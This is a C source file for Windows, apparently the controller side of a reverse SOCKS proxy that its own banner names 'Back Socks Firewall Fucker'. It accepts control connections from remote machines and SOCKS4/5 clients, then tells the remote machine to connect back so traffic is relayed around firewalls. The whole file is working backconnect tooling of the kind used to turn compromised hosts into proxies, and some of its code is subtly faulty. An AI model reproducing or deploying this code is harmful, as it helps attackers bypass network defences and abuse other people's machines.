#include "Stdafx.h"
#include "globals.h"

void OpenControlLink(void)
{
	WSADATA wsaData;
	SOCKET c_socket;
	sockaddr_in service;
	HANDLE hsThread;
	DWORD spId;
	struct ConnectRemoteMachineData crmData;
	
	deb("cl: Back Socks Firewall Fucker v%d starting...", BACK_SOCKS_VERSION);
	ControlLinkEnabled = 1;
	RunControlLink = 1;
	srand(GetCurrentThreadId());
	
	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	
	if (iResult != NO_ERROR) {
		deb("cl: Error at WSAStartup()\n");
		ExitThread((u_int)ERR);
	}
	
	c_socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( c_socket == INVALID_SOCKET ) {
		deb( "cl: Error at socket(): %ld\n", WSAGetLastError() );
		ExitThread((u_int)ERR);
	}
	
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = INADDR_ANY;
	service.sin_port = htons( CONTROLPORT );
	
	if ( bind( c_socket, (SOCKADDR*) &service, sizeof(service) ) == SOCKET_ERROR ) {
		deb("cl: port:%d bind() failed . err:%d\n", ntohs(service.sin_port),
			WSAGetLastError());
		closesocket(c_socket);
		ExitThread((u_int)ERR);
	}
	
	if ( listen( c_socket, SOMAXCONN) == SOCKET_ERROR ) {
		deb( "cl: Error listening on socket.\n");
		ExitThread((u_int)ERR);
	}
	
	SOCKET cli_socket;
	struct sockaddr_in cli_sin;
	int cli_sin_size = sizeof(cli_sin);
	
	while (1) {
		cli_socket = (SOCKET) SOCKET_ERROR;
		deb("cl: accepting control connections...");
		while ( cli_socket == (SOCKET) SOCKET_ERROR ) {
			if(!RunControlLink) {
				deb("cl: exiting...\n");
				closesocket(c_socket);
				ControlLinkEnabled = 0;
				if(cli_socket != (SOCKET) SOCKET_ERROR)
					closesocket(cli_socket);
				ExitThread(SUCCESS);
			}
			if(ReadyToRead(c_socket,1) == SUCCESS) {
				deb("cl: accepting socket");
				cli_socket = accept( c_socket, (struct sockaddr*) &cli_sin, &cli_sin_size );
			} else {
				continue;
			}
			deb("cl: accept socket = %d", cli_socket);
			if(cli_socket == (unsigned int) -1)	{
				deb("cl: cli_socket == -1 ...\n");
				closesocket(c_socket);
				ControlLinkEnabled = 0;
				ExitThread(SUCCESS);
			}
		}
		deb("cl: accepted connection %x", cli_socket);
		
		crmData.sock = cli_socket;
		memcpy(&cli_sin, &crmData.sin, sizeof(cli_sin));
		hsThread = CreateThread( NULL, 0, ConnectRemoteMachine, (void*) &crmData, 0, &spId);
		
		if(hsThread == NULL) {
			deb("cl: failed to create link thread: %s", FORMATERROR);
		}
		CloseHandle(hsThread);
	}
}

DWORD WINAPI ConnectRemoteMachine( LPVOID pcrmData )
{
	struct sockaddr_in cli_sin, peer, service;
	SOCKET cli_socket, client_socket, socks_listen_socket;
	int client_port;
	int peer_size = sizeof(peer);
	struct ConnectRemoteMachineData *crmData;
	char *buffer;
	u_char cur_msg = 0;
	char ipaddress[128];
	int res; // various results
	int psize;
	DWORD thread;
	char *packet;
	char rhost[256];
	int  rport;
	struct msg_info *this_info;
	struct socket_info *socket_info;
	struct pcrData *pcrData;
	char this_good = 1;
	char this_ready = 0;
	char this_error = 0;
	char this_busy = 0;
	char this_got_info = 0;
	char this_pong = 0;
	char this_in_request = 0;
	char this_gotsocket = 0;

	crmData = (ConnectRemoteMachineData*) pcrmData;
	cli_socket = crmData->sock;
	memcpy((void*) &cli_sin, (void*) &crmData->sin, sizeof(cli_sin));
	
	deb("crm: processing control socket %x", cli_socket);
	getpeername(cli_socket,(struct sockaddr*) &peer, &peer_size);
	deb("crm: remote connection from %s:%d", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
	strncpy(ipaddress, inet_ntoa(peer.sin_addr), sizeof(ipaddress));
	
	buffer = (char*) halloc(CRM_BUF_SIZE);
	if(buffer == NULL) {
		deb("crm: failed to alloc %d bytes for buffer", CRM_BUF_SIZE);
		closesocket(cli_socket);
		ExitThread((u_int)ERR);
	}
	
	socks_listen_socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( socks_listen_socket == INVALID_SOCKET ) {
		deb( "cl: Error at socket(): %ld\n", WSAGetLastError() );
		ExitThread((u_int)ERR);
	}
	
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = INADDR_ANY;
	service.sin_port = htons( SOCKS_PORT );
	//service.sin_port = htons(65533);
	
	if ( bind( socks_listen_socket, (SOCKADDR*) &service, sizeof(service) ) == SOCKET_ERROR ) {
		deb("cl: port:%d bind() failed . err:%d\n", ntohs(service.sin_port),
			WSAGetLastError());
		closesocket(socks_listen_socket);
		ExitThread((u_int)ERR);
	}
	
	if ( listen( socks_listen_socket, SOMAXCONN) == SOCKET_ERROR ) 
	{
		deb( "cl: Error listening on socket.\n");
		ExitThread((u_int)ERR);
	}
	
	deb("made socks socket at port %d", SOCKS_PORT);
	
	for(;RunControlLink && this_good;) {
		cur_msg = 0;
		if(!this_ready) {
			res = recv(cli_socket, (char*) &cur_msg, 1, 0);
			if(res == SOCKET_ERROR || res == 0) {
				deb("crm: recieving type msg failed, res = %d", res);
				break;
			}
			
			switch(cur_msg)	{
			case MSG_INFO:
				deb("crm: MSG_INFO");
				res = recv(cli_socket, buffer, sizeof(struct msg_info), 0);
				if(res == SOCKET_ERROR || res == 0)	{
					deb("crm: recieving type msg_info failed, res = %d", res);
					break;
				}
				hexdump(buffer, res);
				this_info = (struct msg_info*) buffer;
				deb("crm: info [ v: %d remote_host: %s ]", this_info->version, 
					inet_ntoa(this_info->host.sin_addr));
				deb("crm: unused1: %x unused2: %x", this_info->unused1, this_info->unused2);
				deb("crm: unused3: %x unused4: %x", this_info->unused3, this_info->unused4);
				this_got_info = 1;
				break;
				
			case MSG_READY:
				deb("crm: MSG_READY");
				deb("crm: client ready for accepting connect requests...");
				this_ready = 1;
				break;
				
			case MSG_BUSY:
				deb("crm: MSG_BUSY");
				this_busy = 1;
				break;
				
			case MSG_PONG:
				deb("crm: MSG_PONG");
				this_pong = 1;
				break;
				
			case MSG_SOCKET:
				deb("crm: MSG_SOCKET");
				res = recv(cli_socket, buffer, sizeof(struct socket_info), 0);
				if(res == SOCKET_ERROR || res == 0) {
					deb("crm: recieving type socket_info failed, res = %d", res);
					break;
				}
				socket_info = (struct socket_info*) buffer;
				deb("crm: socket for %s:%d ready", socket_info->hostname, socket_info->port);
				this_gotsocket = 1;
				break;
				
			case MSG_ERROR:
				deb("crm: MSG_ERROR");
				res = recv(cli_socket, &this_error, 1, 0);
				if(res == SOCKET_ERROR || res == 0) {
					deb("crm: recieving error info failed, res = %d", res);
					break;
				}
				deb("crm: recieved error number: %d", this_error);
				break;
				
			case MSG_RESET:
				deb("crm: MSG_RESET");
				this_good = 1;
				this_ready = 0;
				this_busy = 0;
				this_error = 0;
				this_pong = 0;
				this_gotsocket = 0;
				this_in_request = 0;
				break;
				
			default:
				deb("crm: unknown msg type %x, dropping client", cur_msg);
				this_good = 0;
				break;
			}				/* end switch */
			deb("crm: waiting for ready msg");
			continue;
		}
		
		client_socket = accept( socks_listen_socket, 0, 0 );
		if(client_socket == (u_int) SOCKET_ERROR) {
			deb("accept socks_listen_socket: %s", FORMATERROR);
			continue;
		}
		
		if(socks_get_info(client_socket, rhost, &rport) == ERR) {
			deb("failed to get info from socks client");
			closesocket(client_socket);
			continue;
		}
		
		deb("client want connect to %s:%d", rhost, rport);
		
		client_port = rand();
		packet = MakeCmdPacket(CMD_SYN, rhost, rport, client_port, &psize);
		if( packet == NULL ) {
			deb("crm: internal error");
			this_good = 0;
			break;
		}
		deb("crm: %d packet bytes at 0x%p", psize, packet);
		hexdump((char*) packet, psize);
		res = send(cli_socket, packet, psize, 0);
		hfree(packet);
		if( res == SOCKET_ERROR || res == 0 || res != psize) {
			deb("crm: sending cmd packet failed, res = %d", res);
			this_good = 0;
			break;
		} else {
			deb("crm: request has been sent, waiting for response");
			this_in_request = 1;
			pcrData = (struct pcrData*) halloc(sizeof(struct pcrData));
			if(pcrData == NULL) {
				deb("failed to alloc %d bytes for pcrData", sizeof(struct pcrData));
				break;
			}
			pcrData->client_socket = client_socket;
			pcrData->port = client_port;
			HANDLE hPCR = CreateThread(NULL, 0, &pcr, (void *) pcrData, 0, &thread);
			if(hPCR == NULL) {
				deb("failed to create pcr thread: %s", FORMATERROR);
				break;
			}
			CloseHandle(hPCR);
		}
	}
	
	deb("crm: closing socket && connection %x", cli_socket);
	hfree(buffer);
	closesocket(cli_socket);
	ExitThread(0);
}

DWORD WINAPI pcr(LPVOID pcrData)
{
	struct pcrData pcrd;
	struct sockaddr_in service;
	SOCKET listen_socket, cli_socket, rem_socket;

	deb("pcr: enter, pcrData: 0x%x", pcrData);
	memcpy((void*) &pcrd, pcrData, sizeof(pcrd));
	hfree(pcrData);
	
	deb("pcr: pcrd->client_socket: %d", pcrd.client_socket);
	deb("pcr: pcrd->port: %d", pcrd.port);
	
	listen_socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( listen_socket == INVALID_SOCKET ) {
		deb( "pcr: Error at socket(): %ld\n", WSAGetLastError() );
		ExitThread((u_int)ERR);
	}
	
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = INADDR_ANY;
	service.sin_port = htons( pcrd.port );
	
	if ( bind( listen_socket, (SOCKADDR*) &service, sizeof(service) ) == SOCKET_ERROR ) {
		deb("pcr: port:%d bind() failed . err:%d\n", ntohs(service.sin_port),
			WSAGetLastError());
		closesocket(listen_socket);
		ExitThread((u_int)ERR);
	}
	
	if ( listen( listen_socket, SOMAXCONN) == SOCKET_ERROR ) {
		deb( "pcr: Error listening on socket.\n");
		ExitThread((u_int)ERR);
	}
	
	deb("awaiting connected socket");
	
	rem_socket = accept( listen_socket, 0, 0 );
	if(rem_socket == (u_int) SOCKET_ERROR) {
		deb("accept: %s", FORMATERROR);
		ExitThread(0);
	}
	
	deb("communicating sockets");
	
	closesocket(listen_socket);
	sockets_bio(rem_socket, pcrd.client_socket);
	
	ExitThread(0);
}

char* MakeCmdPacket(int cmd, char* host, int port, int bport, int *packet_size)
{	
	struct cmd_syn_data *packet;
	struct sockaddr_in sin;
	char *pbuf;

	deb("mcp: building packet: cmd: %x host: %s port: %d", cmd, host, port);
	pbuf = (char*) halloc(sizeof(struct cmd_syn_data) + SIZEOF_HEADERS);
	
	if(pbuf == NULL) {
		deb("mcp: failed to alloc %d bytes for cmd packet",
			sizeof(struct cmd_syn_data) + SIZEOF_HEADERS);
		return NULL;
	}
	
	pbuf[0] = (char) CMD_SYN;
	packet = (struct cmd_syn_data*) (pbuf + SIZEOF_HEADERS);
	
	sin.sin_addr.s_addr = resolve(host);
	deb("mcp: resolved %s => %s", host, inet_ntoa(sin.sin_addr));
	sin.sin_port = htons(port);
	sin.sin_family = AF_INET;
	
	memcpy((void*) &packet->sin, (void*) &sin, sizeof(struct sockaddr_in));
	strcpy(packet->hostname, host);
	packet->port = port;
	
	strcpy(packet->bhostname, GetLocalInetAddr());
	packet->bport = bport;
	packet->version = BACK_SOCKS_VERSION;
	
	*(packet_size) = sizeof(struct cmd_syn_data) + SIZEOF_HEADERS;
	return (char*) pbuf;
}

void SendErrorToClient(SOCKET cli_socket, int s_version, int ver, int rep)
{
	struct s5_reply s5rep;
	struct s4_reply s4rep;

	if(s_version == 0x05) {
		s5rep.ver = ver;
		s5rep.rep = rep;
		s5rep.rsv = 0x00;
		s5rep.atyp = 0x00;
		//s5rep.local_addr.s_addr = inet_addr(GetLocalInetAddr());
		s5rep.local_port = htons(666);
		send(cli_socket,(char*)&s5rep,sizeof(s5rep),0);
		closesocket(cli_socket);
	} else {
		s4rep.vn = 0x00;
		s4rep.cd = 91;
		s4rep.d_port = 0x00;
		send(cli_socket,(char*)&s4rep,sizeof(s4rep),0);
		closesocket(cli_socket);
	}
}

int socks_get_info(SOCKET cli_socket, char *rhost, int *rport)
{	
	char s_version;
	char methods[2];
	SOCKET rem_socket;
	struct sockaddr_in peer;
	struct sockaddr_in sin;
	int res,peer_size;
	DWORD nonBlock = 0;
	
	struct s5_packet sq5;
	struct s5_reply s5rep;
	struct s4_packet sq4;
	struct s4_reply s4rep;

	deb("socks: processing socket=%d\n", cli_socket);
	
	ioctlsocket( cli_socket, FIONBIO, &nonBlock ); /* make it blocking */
	
	/* get socks version */
	if((res = recv(cli_socket, &s_version, 1, 0)) == SOCKET_ERROR) {
		deb("could not get first version byte from client\n");
		closesocket(cli_socket);
		return ERR;
	}
	if(res == 0) {
		deb("connection has been reset by remote");
		closesocket(cli_socket);
		return ERR;
	}
	
	if(s_version == 0x05) {
		if((res = recv(cli_socket,methods,2,0)) == SOCKET_ERROR) {
			deb("could not get methods from client\n");
			closesocket(cli_socket);
			
			return ERR;
		}
		methods[0] = 0x05; /* socks 5 version */
		methods[1] = 0x00; /* no auth */
		
		if(send(cli_socket,methods,2,0) == SOCKET_ERROR) {
			deb("could not sent auth reply to client\n");
			closesocket(cli_socket);
			return ERR;
		}
		if((res = recv(cli_socket,(char*) &sq5,sizeof(sq5),0)) == SOCKET_ERROR) 
		{
			deb("could not get sq5 packet from client error:[%s]\n",strerror(NULL));
			closesocket(cli_socket);
			return ERR;
		}
		if(sq5.ver != 0x05) {
			deb("0x%x version mismatch after handshake!\n",sq5.ver);
			SendErrorToClient(cli_socket,s_version,0x05,0x05);
			return ERR;
		}
		if(sq5.cmd != 0x01) {
			deb("method 0x%x not supported yet.\n",sq5.cmd);
			SendErrorToClient(cli_socket,s_version,0x05,0x07);
			return ERR;
		}
		if(sq5.atyp != 0x01) {
			deb("atyp 0x%x other than 0x01\n",sq5.atyp);
			SendErrorToClient(cli_socket,s_version,0x05,0x08);
			return ERR;
		}
		
		rem_socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if ( rem_socket == INVALID_SOCKET ) 
		{
			deb( "in processsocksclient: Error at socket(): %ld\n", WSAGetLastError() );
			SendErrorToClient(cli_socket,s_version,0x05,0x01);
			ExitThread((u_int)ERR);
		}
		
		strcpy(rhost, inet_ntoa(sq5.sin_addr));
		*(rport) = ntohs(sq5.d_port);
		
		/* success connect, send reply about this */
		
		s5rep.ver = 0x05;
		s5rep.rep = 0x00;
		s5rep.rsv = 0x00;
		s5rep.atyp = sq5.atyp;
		getsockname(rem_socket,(struct sockaddr*) &peer,&peer_size);
		s5rep.local_addr = peer.sin_addr;
		s5rep.local_port = peer.sin_port;
		
		if(send(cli_socket,(char*) &s5rep,sizeof(s5rep),0) == SOCKET_ERROR) 
		{
			deb("send error while sending reply %d\n",WSAGetLastError());
			closesocket(cli_socket);	
			return ERR;
		}
		
	} else if(s_version == 0x04) {
		deb("socks 4 version\n");
		sq4.ver = 0x04;
		if((res = recv(cli_socket,(char*) &sq4.cd,sizeof(sq4)-sizeof(char),0)) == SOCKET_ERROR) 
		{
			deb("could not get sq4 packet from client error:[%d]\n",WSAGetLastError());		
			return ERR;
		}
		if(sq4.cd != 0x01) 
		{
			deb("method 0x%02x not supported yet.\n",sq4.cd);
			SendErrorToClient(cli_socket,s_version,0x04,91);
			return ERR;
		}
		rem_socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if ( rem_socket == INVALID_SOCKET ) 
		{
			deb( "in processsocksclient: Error at socket(): %ld\n", WSAGetLastError() );
			SendErrorToClient(cli_socket,s_version,0x04,91);
			return ERR;
		}
		
		strcpy(rhost, inet_ntoa(sq4.sin_addr));
		*(rport) = ntohs(sq4.d_port);
		
		/* success connect, send reply about this */
		
		s4rep.vn = 0x00;
		s4rep.cd = 90;
		s4rep.d_port = sq4.d_port;
		s4rep.sin_addr = sq4.sin_addr;
		
		if(send(cli_socket,(char*) &s4rep,sizeof(s4rep),0) == SOCKET_ERROR) {
			deb("send error while sending reply %d\n",WSAGetLastError());
			closesocket(cli_socket);
			closesocket(rem_socket);	
			return ERR;
		}
	} else {
		deb("0x%02x is unknown socks version for me.\n",s_version);
//#ifdef _DEBUG
		hexdump((char*) &sq4, sizeof(sq4));
//      #endif
		closesocket(cli_socket);
		return ERR;
	}
	
	return SUCCESS;
}